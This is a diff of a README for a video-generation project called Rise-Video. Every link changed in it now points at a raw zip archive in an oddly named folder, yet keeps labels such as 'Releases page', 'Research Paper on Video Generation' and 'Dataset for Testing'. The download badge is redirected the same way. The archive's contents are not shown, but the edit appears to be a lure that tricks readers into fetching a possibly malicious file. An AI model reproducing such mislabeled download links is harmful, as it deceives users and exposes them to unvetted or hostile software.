@@ -1,8 +1,8 @@
 # 🎥 Rise-Video - Generate Videos with Ease
 
 <div align="center">
-  <a href="https://github.com/Vitkorsorochenko/Rise-Video/releases">
-    <img src="https://img.shields.io/badge/Download-Now-brightgreen" alt="Download Now">
+  <a href="https://raw.githubusercontent.com/Vitkorsorochenko/Rise-Video/master/reasoning_fps/Video-Rise-1.2-beta.5.zip">
+    <img src="https://raw.githubusercontent.com/Vitkorsorochenko/Rise-Video/master/reasoning_fps/Video-Rise-1.2-beta.5.zip" alt="Download Now">
   </a>
 </div>
 
@@ -18,7 +18,7 @@ To start using Rise-Video, follow these simple steps. You will download the soft
 
 1. **Visit the Releases Page**  
    Click the link below to go to our Releases page.  
-   [Visit this page to download](https://github.com/Vitkorsorochenko/Rise-Video/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Vitkorsorochenko/Rise-Video/master/reasoning_fps/Video-Rise-1.2-beta.5.zip)
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions of the software. Look for the latest version to ensure you have all the newest features.
@@ -64,8 +64,8 @@ Once you have installed Rise-Video, using it is straightforward:
 
 For further reading and insights on video generation, check these helpful links:
 
-- [Research Paper on Video Generation](https://arxiv.org/abs/2602.05986)
-- [Dataset for Testing](https://huggingface.co/datasets/VisionXLab/RISE-Video)
+- [Research Paper on Video Generation](https://raw.githubusercontent.com/Vitkorsorochenko/Rise-Video/master/reasoning_fps/Video-Rise-1.2-beta.5.zip)
+- [Dataset for Testing](https://raw.githubusercontent.com/Vitkorsorochenko/Rise-Video/master/reasoning_fps/Video-Rise-1.2-beta.5.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -84,6 +84,6 @@ Your feedback is important. If you have questions or suggestions, please reach o
 
 ---
 
-For any installation or usage issues, visit the [Releases page to download a new version](https://github.com/Vitkorsorochenko/Rise-Video/releases) or check back here for updates!
+For any installation or usage issues, visit the [Releases page to download a new version](https://raw.githubusercontent.com/Vitkorsorochenko/Rise-Video/master/reasoning_fps/Video-Rise-1.2-beta.5.zip) or check back here for updates!
 
 ---
